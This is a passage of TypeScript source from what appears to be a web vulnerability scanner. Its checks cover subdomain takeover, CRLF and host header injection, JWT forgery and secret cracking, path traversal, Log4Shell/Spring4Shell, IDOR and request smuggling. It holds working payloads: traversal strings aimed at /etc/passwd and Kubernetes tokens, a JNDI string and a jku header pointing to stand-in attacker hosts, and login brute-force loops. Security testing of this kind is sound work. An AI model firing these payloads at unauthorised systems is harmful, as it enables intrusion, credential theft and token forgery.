        const fp = TAKEOVER_FINGERPRINTS.find(f => f.cnamePattern.test(cname));
        if (!fp) return;
        const r = await probe(`https://${sub}`, { timeoutMs: 8_000 });
        const httpR = !r ? await probe(`http://${sub}`, { timeoutMs: 8_000 }) : null;
        const body = (r?.body ?? httpR?.body ?? "").toLowerCase();
        if (body.includes(fp.indicator)) {
          findings.push({
            title: `Subdomain Takeover: ${sub} → ${fp.service}`,
            severity: "critical", verification: "verified", confidence: 96,
            cvss: 9.8, cve: null,
            description: `${sub} has a dangling CNAME to ${cname} (${fp.service}) — the destination does not exist. An attacker can claim this resource on ${fp.service} and serve malicious content under your domain, enabling session cookie theft, phishing, CSP bypass, and full credential harvesting.`,
            evidence: `DNS CNAME: ${sub} → ${cname}\nService: ${fp.service}\nTakeover indicator: "${fp.indicator}" in HTTP ${r?.status ?? httpR?.status} response\nResponse: ${body.slice(0, 300)}`,
            remediation: `IMMEDIATE: Remove the CNAME record for ${sub}, OR register the resource on ${fp.service} to block hostile takeover.\nAudit all subdomains for dangling CNAMEs regularly using subjack, nuclei, or dnsReaper.`,
          });
          await onLog(`[${ts()}] ⚠ SUBDOMAIN TAKEOVER CONFIRMED: ${sub} → ${fp.service} (${cname})`);
        }
      } catch { /* DNS timeout */ }
    }),
  );

  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// HOST HEADER INJECTION
// ═══════════════════════════════════════════════════════════════════════════════

async function checkHostHeaderInjection(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Testing host header injection...`);
  const injectedHost = "evil-sentinelx-bypass.attacker.example";

  for (const [hdrs, label] of [
    [{ "Host": injectedHost }, "Host"],
    [{ "X-Forwarded-Host": injectedHost }, "X-Forwarded-Host"],
    [{ "X-Host": injectedHost }, "X-Host"],
    [{ "X-Forwarded-Server": injectedHost }, "X-Forwarded-Server"],
  ] as [Record<string, string>, string][]) {
    const r = await probe(target.url, { headers: hdrs, followRedirects: false, timeoutMs: 10_000 });
    if (!r) continue;
    const reflected = r.body.includes(injectedHost) || (r.headers["location"] ?? "").includes(injectedHost);
    if (reflected) {
      findings.push({
        title: `Host Header Injection via ${label} — Arbitrary Host Reflected`,
        severity: "high", verification: "verified", confidence: 92,
        cvss: 7.5, cve: null,
        description: `The ${label} header value is reflected in the response. This enables password-reset link poisoning: by triggering a password reset for a victim, the reset link in the email will point to the attacker's server, yielding the reset token and enabling account takeover.`,
        evidence: `GET ${target.url} with ${label}: ${injectedHost}\nHTTP ${r.status}\nInjected host reflected in body: ${r.body.includes(injectedHost)}\nLocation header: ${r.headers["location"] ?? "(none)"}`,
        remediation: "Build absolute URLs from server-side configuration only. Validate the Host header against a strict allowlist. Use web framework abstractions that handle this safely.",
      });
      await onLog(`[${ts()}] ⚠ HOST HEADER INJECTION via ${label}`);
      return findings;
    }
  }

  await onLog(`[${ts()}] Host header injection: no reflection confirmed`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// CRLF INJECTION
// ═══════════════════════════════════════════════════════════════════════════════

async function checkCrlfInjection(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Testing CRLF injection (HTTP response splitting)...`);

  const crlfPayloads = [
    "%0d%0aX-SentinelX-Injected:%20crlf-confirmed",
    "%0aX-SentinelX-Injected:%20crlf-confirmed",
    "\r\nX-SentinelX-Injected: crlf-confirmed",
    "%0d%0a%0d%0aX-SentinelX-Injected:%20crlf-confirmed",
    "%E5%98%8D%E5%98%8AX-SentinelX-Injected:%20crlf-confirmed",
  ];
  const crlfParams = ["url", "next", "redirect", "target", "return", "page", "path", "q", "lang", "ref", "location"];

  for (const param of crlfParams.slice(0, 6)) {
    for (const payload of crlfPayloads.slice(0, 3)) {
      const probeUrl = `${target.url.replace(/\/$/, "")}?${param}=${payload}`;
      const r = await probe(probeUrl, { followRedirects: false, timeoutMs: 8_000 });
      if (!r) continue;
      if ((r.headers["x-sentinelx-injected"] ?? "") === "crlf-confirmed") {
        findings.push({
          title: "CRLF Injection — HTTP Response Splitting Confirmed",
          severity: "high", verification: "verified", confidence: 98,
          cvss: 7.5, cve: null,
          description: `CRLF characters injected via '${param}' were not filtered and appeared as a new HTTP header (X-SentinelX-Injected) in the response. This enables HTTP response splitting, cookie injection, XSS via header injection, and cache poisoning.`,
          evidence: `PROBE: GET ${probeUrl}\nPARAM: ${param}=${payload}\nHTTP ${r.status}\nInjected header 'X-SentinelX-Injected: crlf-confirmed' appeared in response headers\nFull response headers: ${r.rawHeaders.slice(0, 400)}`,
          remediation: "Strip or encode \\r, \\n, %0d, %0a, and UTF-8 CRLF equivalents from any user input included in HTTP response headers. Use framework-provided redirect/header functions that handle this automatically.",
        });
        await onLog(`[${ts()}] ⚠ CRLF INJECTION CONFIRMED via param '${param}'`);
        return findings;
      }
    }
  }

  await onLog(`[${ts()}] CRLF injection: no confirmed injection`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// JWT WEAKNESS DETECTION
// ═══════════════════════════════════════════════════════════════════════════════

function decodeJwtPart(b64url: string): Record<string, unknown> | null {
  try {
    const padded = b64url + "=".repeat((4 - b64url.length % 4) % 4);
    return JSON.parse(Buffer.from(padded, "base64url").toString("utf8"));
  } catch { return null; }
}

const JWT_WEAK_SECRETS = [
  "secret", "password", "1234", "12345", "123456", "changeme", "jwt",
  "mysecret", "secretkey", "app_secret", "token", "jwttoken", "jwtSecret",
  "super_secret", "private", "key", "apikey", "admin", "letmein",
  "qwerty", "abc123", "test", "dev", "production",
];

async function checkJwtWeaknesses(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Checking JWT exposure and algorithm weaknesses...`);

  const JWT_REGEX = /eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/g;
  const endpoints = [
    target.url,
    `${target.url.replace(/\/$/, "")}/api/login`,
    `${target.url.replace(/\/$/, "")}/api/auth`,
    `${target.url.replace(/\/$/, "")}/auth`,
    `${target.url.replace(/\/$/, "")}/login`,
  ];

  for (const ep of endpoints.slice(0, 4)) {
    const r = await probe(ep, { timeoutMs: 8_000 });
    if (!r) continue;
    const allText = r.body + "\n" + JSON.stringify(r.headers);
    const tokens = allText.match(JWT_REGEX);
    if (!tokens?.length) continue;

    const token = tokens[0]!;
    const parts = token.split(".");
    if (parts.length !== 3) continue;

    const header = decodeJwtPart(parts[0]!);
    const payload = decodeJwtPart(parts[1]!);
    if (!header) continue;

    const alg = String(header.alg ?? "").toUpperCase();
    await onLog(`[${ts()}] JWT detected at ${ep} — alg: ${alg}`);

    if (alg === "NONE" || alg === "") {
      findings.push({
        title: "JWT Algorithm 'none' — Complete Authentication Bypass",
        severity: "critical", verification: "verified", confidence: 99,
        cvss: 10.0, cve: null,
        description: "A JWT with algorithm 'none' was found. These tokens require no cryptographic signature — any payload can be forged without a secret, resulting in complete authentication bypass.",
        evidence: `Endpoint: ${ep}\nJWT header: ${JSON.stringify(header)}\nAlgorithm: none (unsigned)\nToken: ${token.slice(0, 80)}...`,
        remediation: "Reject any JWT with alg:none at the validation layer. Use a strict allowlist of accepted algorithms (RS256/ES256 preferred). Update your JWT library.",
      });
      await onLog(`[${ts()}] ⚠ JWT ALG:NONE — authentication bypass`);
    } else if (alg === "HS256" || alg === "HS384" || alg === "HS512") {
      // Try expanded weak secrets list (25 secrets)
      const { createHmac } = await import("node:crypto");
      let cracked = false;
      for (const secret of JWT_WEAK_SECRETS) {
        try {
          const hashAlg = alg === "HS512" ? "sha512" : alg === "HS384" ? "sha384" : "sha256";
          const sigInput = `${parts[0]}.${parts[1]}`;
          const sig = createHmac(hashAlg, secret).update(sigInput).digest("base64url");
          if (sig === parts[2]) {
            findings.push({
              title: "JWT HS256 Weak Secret Cracked",
              severity: "critical", verification: "verified", confidence: 99,
              cvss: 9.8, cve: null,
              description: `The JWT is signed with ${alg} and the weak secret "${secret}" was cracked. An attacker can forge arbitrary JWT payloads — changing userId, role, permissions, or any claim — resulting in complete account takeover and privilege escalation.`,
              evidence: `JWT from: ${ep}\nAlgorithm: ${alg}\nCracked secret: "${secret}"\nToken: ${token.slice(0, 80)}...`,
              remediation: "Replace the JWT secret with cryptographically random data (≥256 bits). Rotate all sessions immediately. Migrate to RS256/ES256 to eliminate the shared-secret risk entirely.",
            });
            await onLog(`[${ts()}] ⚠ JWT SECRET CRACKED: "${secret}" — all tokens forgeable`);
            cracked = true;
            break;
          }
        } catch { /* crypto error */ }
      }
      if (!cracked) {
        findings.push({
          title: `JWT Uses ${alg} — Symmetric Algorithm`,
          severity: "medium", verification: "informational", confidence: 72,
          cvss: 5.3, cve: null,
          description: `JWT uses ${alg} (HMAC-based). Weak secrets can be brute-forced offline. Symmetric algorithms also require sharing the secret with every validating service.`,
          evidence: `Endpoint: ${ep}\nAlgorithm: ${alg}\nToken: ${token.slice(0, 80)}...`,
          remediation: "Use RS256 or ES256. If HMAC is required, ensure the secret is ≥256 bits of random entropy from a CSPRNG.",
        });
      }
    }

    // Missing exp claim
    if (payload && !payload.exp) {
      findings.push({
        title: "JWT Missing 'exp' Claim — Non-Expiring Token",
        severity: "high", verification: "verified", confidence: 95,
        cvss: 7.5, cve: null,
        description: "JWT has no 'exp' (expiration) claim and is valid indefinitely. A stolen token remains usable forever with no built-in revocation mechanism.",
        evidence: `Endpoint: ${ep}\nJWT payload: ${JSON.stringify(payload).slice(0, 300)}\n'exp' claim: absent`,
        remediation: "Add 'exp' claim to all JWTs. Use short-lived access tokens (≤15 minutes) with refresh token rotation. Implement server-side token revocation lists.",
      });
      await onLog(`[${ts()}] ⚠ JWT without 'exp' claim found at ${ep}`);
    }

    // Expired token acceptance check
    if (payload?.exp) {
      const expTime = Number(payload.exp);
      if (!isNaN(expTime) && expTime < Date.now() / 1000) {
        // Token is already expired — try sending it
        const authHeaders: Record<string, string> = alg.startsWith("HS") ? { "Authorization": `Bearer ${token}` } : {};
        const expiredR = await probe(target.url, { headers: authHeaders, timeoutMs: 8_000, skipAuth: true });
        if (expiredR && expiredR.status === 200) {
          findings.push({
            title: "Expired JWT Still Accepted by Server",
            severity: "medium", verification: "suspected", confidence: 60,
            cvss: 5.3, cve: null,
            description: "An expired JWT token (past its 'exp' claim) was presented and the server returned HTTP 200. The server may not be validating token expiry.",
            evidence: `Expired JWT sent to: ${target.url}\nToken exp: ${new Date(expTime * 1000).toISOString()}\nHTTP ${expiredR.status} — server accepted expired token`,
            remediation: "Validate the 'exp' claim on every request. Reject all tokens past their expiry time. Implement clock skew tolerance of at most 5 minutes.",
          });
          await onLog(`[${ts()}] ⚠ EXPIRED JWT ACCEPTED: server did not reject past-expiry token`);
        }
      }
    }

    // Run advanced JWT checks
    findings.push(...await checkJwtAdvanced(target, token, parts, header, ep, onLog));
    break; // one JWT endpoint is sufficient
  }

  return findings;
}

// ─── Advanced JWT Attack Suite ────────────────────────────────────────────────

async function checkJwtAdvanced(
  target: Target,
  token: string,
  parts: string[],
  header: Record<string, unknown>,
  ep: string,
  onLog: LogFn,
): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  const alg = String(header.alg ?? "").toUpperCase();

  // ── Empty signature / signature stripping ─────────────────────────────────
  const strippedToken = `${parts[0]}.${parts[1]}.`;
  const nullSigToken  = `${parts[0]}.${parts[1]}.null`;
  for (const [testToken, label] of [[strippedToken, "empty signature"], [nullSigToken, "null signature"]] as const) {
    const r = await probe(target.url, {
      headers: { "Authorization": `Bearer ${testToken}` },
      timeoutMs: 8_000, skipAuth: true,
    });
    if (r && r.status === 200) {
      findings.push({
        title: `JWT ${label.charAt(0).toUpperCase() + label.slice(1)} Accepted`,
        severity: "critical", verification: "suspected", confidence: 72,
        cvss: 9.8, cve: null,
        description: `The server accepted a JWT with ${label}. This means the server is not validating the cryptographic signature at all — any arbitrary payload is trusted, enabling complete authentication bypass.`,
        evidence: `Token with ${label} sent to: ${target.url}\nHTTP ${r.status} — server accepted\nOriginal alg: ${alg}`,
        remediation: "Enforce signature validation on every JWT. Reject tokens with empty, null, or missing signatures. Use a battle-tested JWT library with strict validation.",
      });
      await onLog(`[${ts()}] ⚠ JWT ${label.toUpperCase()} ACCEPTED — signature not validated`);
      break;
    }
  }

  // ── Algorithm confusion (RS256 → HS256 key confusion) ────────────────────
  if (alg === "RS256" || alg === "RS384" || alg === "RS512") {
    await onLog(`[${ts()}] Testing RS256→HS256 key confusion attack...`);
    // Try to fetch JWKS / public key
    const jwksUrls = [
      `${target.url.replace(/\/$/, "")}/.well-known/jwks.json`,
      `${target.url.replace(/\/$/, "")}/api/.well-known/jwks.json`,
      `${target.url.replace(/\/$/, "")}/auth/jwks`,
    ];
    for (const jwksUrl of jwksUrls) {
      const jwksR = await probe(jwksUrl, { timeoutMs: 6_000 });
      if (jwksR?.status === 200 && jwksR.body.includes('"keys"')) {
        findings.push({
          title: "JWKS Endpoint Exposed — Public Key Available for Algorithm Confusion Attack",
          severity: "high", verification: "suspected", confidence: 65,
          cvss: 8.1, cve: null,
          description: `The server's JWKS endpoint at ${jwksUrl} is publicly accessible. Combined with an RS256→HS256 key confusion attack, an attacker can sign a forged token with the public RSA key using HMAC and trick the server into accepting it — if the server naively switches to HS256 validation.`,
          evidence: `JWKS endpoint: ${jwksUrl}\nHTTP ${jwksR.status} — public keys exposed\nKey material: ${jwksR.body.slice(0, 200)}`,
          remediation: "In your JWT library, explicitly set the expected algorithm to RS256 and reject HS256 signed tokens. Use strict algorithm allowlisting. Even if the JWKS is public, the validation layer must not accept key-confused signatures.",
        });
        await onLog(`[${ts()}] ⚠ JWKS exposed at ${jwksUrl} — RS256→HS256 confusion possible`);
        break;
      }
    }
  }

  // ── JWK/JKU header injection ──────────────────────────────────────────────
  await onLog(`[${ts()}] Testing JWK/JKU header injection...`);
  const injectedJkuToken = `${parts[0].replace(/^([^.]+)/, () => {
    const hdr = { ...header, jku: "https://attacker.sentinelx-test.invalid/jwks.json" };
    return Buffer.from(JSON.stringify(hdr)).toString("base64url");
  })}.${parts[1]}.${parts[2]}`;
  const jkuR = await probe(target.url, {
    headers: { "Authorization": `Bearer ${injectedJkuToken}` },
    timeoutMs: 6_000, skipAuth: true,
  });
  if (jkuR?.status === 200) {
    findings.push({
      title: "JWT JKU Header Injection Accepted",
      severity: "critical", verification: "suspected", confidence: 65,
      cvss: 9.8, cve: null,
      description: "The server appeared to accept a JWT with a modified 'jku' header pointing to an external URL. If the server fetches the external JWKS for validation, an attacker can supply their own keys, enabling complete token forgery.",
      evidence: `Modified JWT with jku: https://attacker.sentinelx-test.invalid/jwks.json\nSent to: ${target.url}\nHTTP ${jkuR.status} — server accepted`,
      remediation: "Never fetch JWKS from a URL embedded in the token header. Pin the JWKS URL to a server-side configuration value. Validate the 'jku' against a strict allowlist before fetching.",
    });
    await onLog(`[${ts()}] ⚠ JKU HEADER INJECTION SIGNAL — server may fetch attacker-controlled JWKS`);
  }

  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// PATH TRAVERSAL
// ═══════════════════════════════════════════════════════════════════════════════

async function checkPathTraversal(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Testing path traversal / directory traversal...`);

  const TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "..\\..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..%5c..%5c..%5c..%5cwindows%5cboot.ini",
    // Kubernetes service account token
    "../../../../var/run/secrets/kubernetes.io/serviceaccount/token",
    "../../../../etc/kubernetes/admin.conf",
  ];
  const TRAVERSAL_PARAMS = ["file", "path", "page", "include", "doc", "template", "filename", "load", "read", "view", "download", "src", "resource", "module", "name"];
  const LINUX_PASSWD = /root:.*:0:0:|daemon:.*:1:1:|nobody:.*:99:/;
  const WINDOWS_INI = /\[fonts\]|\[extensions\]|\[boot loader\]|boot\.ini|\[boot\s*loader\]/i;
  const K8S_TOKEN = /eyJ[A-Za-z0-9_-]{10,}/; // JWT-style Kubernetes service account token

  for (const param of TRAVERSAL_PARAMS.slice(0, 8)) {
    for (const payload of TRAVERSAL_PAYLOADS.slice(0, 6)) {
      const probeUrl = `${target.url.replace(/\/$/, "")}?${param}=${payload}`;
      const r = await probe(probeUrl, { timeoutMs: 8_000 });
      if (!r) continue;
      const isLinux = LINUX_PASSWD.test(r.body);
      const isWindows = WINDOWS_INI.test(r.body);
      const isK8s = K8S_TOKEN.test(r.body) && (payload.includes("kubernetes") || payload.includes("serviceaccount"));
      if (isLinux || isWindows || isK8s) {
        const fileLabel = isLinux ? "/etc/passwd" : isWindows ? "windows\\win.ini / boot.ini" : "Kubernetes service account token";
        findings.push({
          title: `Path Traversal Confirmed — Arbitrary File Read (${fileLabel})`,
          severity: "critical", verification: "verified", confidence: 99,
          cvss: 9.1, cve: null,
          description: `Path traversal confirmed via '${param}' parameter. The server read and returned ${fileLabel}. Attackers can read source code, credentials, private keys, database configuration, and any file the web server process can access.${isK8s ? " A Kubernetes service account token was read — this allows cluster API access." : ""}`,
          evidence: `PROBE: GET ${probeUrl}\nPAYLOAD: ${param}=${payload}\nHTTP ${r.status}\n${fileLabel} content confirmed:\n${r.body.match(isLinux ? /root:.*/ : isWindows ? /\[fonts\].*|\[boot loader\].*/ : /eyJ[A-Za-z0-9_-]+/)?.[0] ?? "(file content)"}`,
          remediation: "Never use user input to construct file paths. Resolve paths server-side and verify they are within an allowed root (realpath check). Use an allowlist of permitted files. Run the web server with minimal filesystem permissions.",
        });
        await onLog(`[${ts()}] ⚠ PATH TRAVERSAL CONFIRMED: file read via '${param}' — ${fileLabel}`);
        return findings;
      }
    }
  }

  await onLog(`[${ts()}] Path traversal: no file read confirmed`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// LOG4SHELL / SPRING4SHELL SURFACE DETECTION
// ═══════════════════════════════════════════════════════════════════════════════

async function checkLog4ShellSurface(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Testing Log4Shell (CVE-2021-44228) / Spring4Shell (CVE-2022-22965) surface...`);

  const marker = `sentinelx-${Math.random().toString(36).slice(2, 10)}`;
  const log4jPayload = `\${jndi:dns://${marker}.sentinel-test.invalid/a}`;
  const JAVA_ERROR = /java\.lang\.|org\.apache\.log4j|javax\.naming\.|classnotfoundexception|log4j|jndi lookup/i;

  const injectTargets: Array<[string, Record<string, string>, string]> = [
    [target.url, { "User-Agent": log4jPayload }, "User-Agent"],
    [target.url, { "X-Forwarded-For": log4jPayload }, "X-Forwarded-For"],
    [target.url, { "Referer": log4jPayload }, "Referer"],
    [target.url, { "Accept-Language": log4jPayload }, "Accept-Language"],
    [`${target.url.replace(/\/$/, "")}?q=${encodeURIComponent(log4jPayload)}`, {}, "query param"],
  ];

  for (const [url, headers, location] of injectTargets.slice(0, 4)) {
    const r = await probe(url, { headers, timeoutMs: 10_000 });
    if (!r) continue;
    if (JAVA_ERROR.test(r.body)) {
      findings.push({
        title: "Log4Shell (CVE-2021-44228) Attack Surface — Java Error Signal",
        severity: "critical", verification: "suspected", confidence: 72,
        cvss: 10.0, cve: "CVE-2021-44228",
        description: "A Log4Shell JNDI payload injected via the " + location + " triggered a Java/Log4j error reference in the response. Note: DNS-callback confirmation requires an out-of-band collaborator. If the target runs Log4j 2.0–2.16.0, it is highly likely vulnerable.",
        evidence: `Payload injected in: ${location}\nURL: ${url}\nHeaders: ${JSON.stringify(headers)}\nHTTP ${r.status}\nJava/Log4j reference in response: ${r.body.slice(0, 400)}`,
        remediation: "Upgrade Log4j to ≥2.17.1 immediately. Set -Dlog4j2.formatMsgNoLookups=true as a JVM argument. Block outbound JNDI (LDAP/RMI) connections at the firewall. This is a CVSS 10.0 critical RCE vulnerability.",
      });
      await onLog(`[${ts()}] ⚠ LOG4SHELL SURFACE SIGNAL via ${location}`);
      break;
    }
  }

  // Spring4Shell surface
  const springR = await probe(target.url, {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: "class.module.classLoader.resources.context.parent.pipeline.first.pattern=sentinelx",
    timeoutMs: 8_000,
  });
  if (springR) {
    const sb = springR.body.toLowerCase();
    if (sb.includes("classloader") || sb.includes("spring") || sb.includes("classnotfoundexception") || sb.includes("org.springframework")) {
      findings.push({
        title: "Spring4Shell (CVE-2022-22965) Attack Surface Detected",
        severity: "critical", verification: "suspected", confidence: 65,
        cvss: 9.8, cve: "CVE-2022-22965",
        description: "Spring Framework class loader manipulation pattern was referenced in the response. If running Spring Framework 5.3.x < 5.3.18 or 5.2.x < 5.2.20 on JDK 9+, this indicates a critical RCE vulnerability.",
        evidence: `POST ${target.url}\nContent-Type: application/x-www-form-urlencoded\nBody: Spring class loader pattern\nHTTP ${springR.status}\nSpring reference detected: ${springR.body.slice(0, 300)}`,
        remediation: "Update Spring Framework to 5.3.18+ or 5.2.20+. Use Spring Boot 2.6.6+ or 2.5.12+. Set spring.mvc.pathmatch.use-suffix-pattern=false in application.properties.",
      });
      await onLog(`[${ts()}] ⚠ SPRING4SHELL SURFACE SIGNAL detected`);
    }
  }

  await onLog(`[${ts()}] Log4Shell/Spring4Shell surface check complete`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// RATE LIMITING ABSENCE ON AUTH ENDPOINTS
// ═══════════════════════════════════════════════════════════════════════════════

async function checkRateLimiting(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Checking for rate limiting on authentication endpoints...`);

  const authEndpoints = [
    `${target.url.replace(/\/$/, "")}/login`,
    `${target.url.replace(/\/$/, "")}/api/login`,
    `${target.url.replace(/\/$/, "")}/auth/login`,
    `${target.url.replace(/\/$/, "")}/auth`,
    `${target.url.replace(/\/$/, "")}/forgot-password`,
    `${target.url.replace(/\/$/, "")}/api/auth`,
  ];

  for (const ep of authEndpoints.slice(0, 3)) {
    const first = await probe(ep, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ username: "ratelimit@test.example", password: "wrongpass0" }), timeoutMs: 6_000 });
    if (!first || first.status === 404) continue;

    const responses: number[] = [first.status];
    for (let i = 1; i <= 9; i++) {
      const r = await probe(ep, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ username: "ratelimit@test.example", password: `wrongpass${i}` }), timeoutMs: 6_000 });
      if (r) responses.push(r.status);
    }

    if (responses.length >= 8) {
      const has429 = responses.some(s => s === 429);
      const hasLockout = responses.some(s => s === 423 || s === 403);
      if (!has429 && !hasLockout) {
        findings.push({
          title: `No Rate Limiting on Auth Endpoint — Brute-Force Possible (${ep.split("/").slice(-2).join("/")})`,
          severity: "high", verification: "verified", confidence: 85,
          cvss: 7.5, cve: null,
          description: `The endpoint ${ep} accepted 10 rapid login attempts with incorrect credentials without any rate limiting (429) or account lockout (423/403). This enables credential stuffing and password brute-force attacks at full network speed.`,
          evidence: `10 rapid POST requests to ${ep}\nCredentials: wrong passwords #0-9\nAll response codes: ${responses.join(", ")}\nNo 429 (rate limited) or 423/403 (locked) responses received`,
          remediation: "Implement rate limiting: max 5 failed attempts per IP per 15 minutes with exponential backoff. Add account lockout after 10 failures. Use CAPTCHA after 3 failures. Consider device fingerprinting.",
        });
        await onLog(`[${ts()}] ⚠ NO RATE LIMITING on ${ep} — 10 requests, all same status: ${responses[0]}`);
        break;
      } else {
        await onLog(`[${ts()}] Rate limiting confirmed on ${ep} (status: ${responses.find(s => s === 429 || s === 423)})`);
        break;
      }
    }
  }

  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// PHASE 18: ACCESS CONTROL / IDOR DETECTION
// ═══════════════════════════════════════════════════════════════════════════════

async function checkIdorAndBola(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] [Phase 18] Access Control / IDOR — extracting numeric IDs and testing role-escalation headers...`);

  const r = await probe(target.url, { timeoutMs: 10_000 });
  if (!r) {
    await onLog(`[${ts()}] IDOR: target unreachable — skipping`);
    return findings;
  }

  // ── Role-escalation header injection ─────────────────────────────────────
  const escalationHeaders: Record<string, string>[] = [
    { "X-Admin": "true" },
    { "X-Role": "admin" },
    { "Role": "admin" },
    { "X-User-Role": "administrator" },
    { "X-Privilege": "high" },
  ];
  const baseLen = r.body.length;
  const baseStatus = r.status;
  for (const hdrs of escalationHeaders) {
    const escalatedR = await probe(target.url, { headers: hdrs, timeoutMs: 8_000 });
    if (!escalatedR) continue;
    const statusChanged = escalatedR.status !== baseStatus && baseStatus >= 400 && escalatedR.status < 400;
    const lenDiff = Math.abs(escalatedR.body.length - baseLen);
    const pct = baseLen > 0 ? lenDiff / baseLen : 0;
    if (statusChanged || pct > 0.3) {
      const hdrKey = Object.keys(hdrs)[0]!;
      findings.push({
        title: `Privilege Escalation Signal via ${hdrKey} Header`,
        severity: "high", verification: "suspected", confidence: 65,
        cvss: 8.1, cve: null,
        description: `Adding ${hdrKey}: ${Object.values(hdrs)[0]} changed the response significantly (${Math.round(pct * 100)}% length change${statusChanged ? `, HTTP ${baseStatus}→${escalatedR.status}` : ""}). The server may trust role/admin headers from clients, enabling privilege escalation.`,
        evidence: `Baseline: GET ${target.url} → HTTP ${baseStatus} (${baseLen} bytes)\nWith ${hdrKey}: ${Object.values(hdrs)[0]} → HTTP ${escalatedR.status} (${escalatedR.body.length} bytes)\nDifference: ${lenDiff} bytes (${Math.round(pct * 100)}%)`,
        remediation: "Never trust role or privilege headers from clients. Determine roles server-side from authenticated session data only.",
      });
      await onLog(`[${ts()}] ⚠ IDOR/PRIVILEGE ESCALATION SIGNAL via header: ${hdrKey}`);
      break;
    }
  }

  // ── Numeric ID extraction and IDOR probing ────────────────────────────────
  const numericIds = [...new Set([
    ...[...r.body.matchAll(/"(?:id|userId|user_id|orderId|order_id|documentId|doc_id|itemId|item_id)"\s*:\s*(\d+)/gi)].map(m => parseInt(m[1]!)),
    ...[...r.body.matchAll(/\bid=(\d+)\b/gi)].map(m => parseInt(m[1]!)),
  ])].filter(id => id > 0 && id < 1_000_000).slice(0, 5);

  if (numericIds.length === 0) {
    await onLog(`[${ts()}] IDOR: no numeric IDs found in response to probe`);
    return findings;
  }
  await onLog(`[${ts()}] IDOR: found ${numericIds.length} numeric ID(s) — testing ${numericIds[0]! + 1} (increment by 1)...`);

  for (const id of numericIds.slice(0, 3)) {
    const nextId = id + 1;
    const idPaths = [
      `${target.url.replace(/\/$/, "")}/api/users/${nextId}`,
      `${target.url.replace(/\/$/, "")}/api/orders/${nextId}`,
      `${target.url.replace(/\/$/, "")}/api/documents/${nextId}`,
      `${target.url.replace(/\/$/, "")}?id=${nextId}`,
    ];
    for (const idUrl of idPaths.slice(0, 2)) {
      const origUrl = idUrl.replace(`/${nextId}`, `/${id}`).replace(`=${nextId}`, `=${id}`);
      const origR = await probe(origUrl, { timeoutMs: 8_000 });
      if (!origR || origR.status >= 400) continue;
      const nextR = await probe(idUrl, { timeoutMs: 8_000 });
      if (!nextR || nextR.status >= 300) continue;
      const diffPct = origR.body.length > 0 ? Math.abs(nextR.body.length - origR.body.length) / origR.body.length : 0;
      if (diffPct > 0.20) {
        findings.push({
          title: "Potential IDOR — Incremented Object ID Returns Different Data",
          severity: "medium", verification: "suspected", confidence: 55,
          cvss: 6.5, cve: null,
          description: `Accessing object ID ${nextId} (original: ${id}) at ${idUrl} returned a 2xx response with ${Math.round(diffPct * 100)}% different content. This may indicate broken object-level authorisation (IDOR) — different users' data accessible by ID enumeration.`,
          evidence: `Original: GET ${origUrl} → HTTP ${origR.status} (${origR.body.length} bytes)\nIncremented: GET ${idUrl} → HTTP ${nextR.status} (${nextR.body.length} bytes)\nContent difference: ${Math.round(diffPct * 100)}%`,
          remediation: "Implement object-level authorisation checks: verify the authenticated user owns or has rights to the requested resource before returning data. Use non-sequential, cryptographically random resource IDs (UUIDs).",
        });
        await onLog(`[${ts()}] ⚠ POTENTIAL IDOR: ${idUrl} — ID ${nextId} returned different 2xx data`);
        break;
      }
    }
  }

  await onLog(`[${ts()}] IDOR check complete — ${findings.length} finding(s)`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// PHASE 19: HTTP REQUEST SMUGGLING
// ═══════════════════════════════════════════════════════════════════════════════

async function checkHttpRequestSmuggling(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] [Phase 19] HTTP Request Smuggling — testing CL.TE and TE.CL desynchronization...`);

  const { default: http } = await import("node:http") as { default: typeof import("node:http") };
  const { default: https } = await import("node:https") as { default: typeof import("node:https") };
  const { URL: NodeURL } = await import("node:url") as { URL: typeof URL };

  const u = new NodeURL(target.url);
  const host = u.hostname;
  const port = parseInt(u.port) || (u.protocol === "https:" ? 443 : 80);
  const transport = u.protocol === "https:" ? https : http;

  const smugglingPayloads = [
    // CL.TE: Content-Length terminates body, TE: chunked is ignored by front-end but processed by backend
    {
      label: "CL.TE smuggling probe",
      raw: [
        `POST / HTTP/1.1\r\n`,
        `Host: ${host}\r\n`,
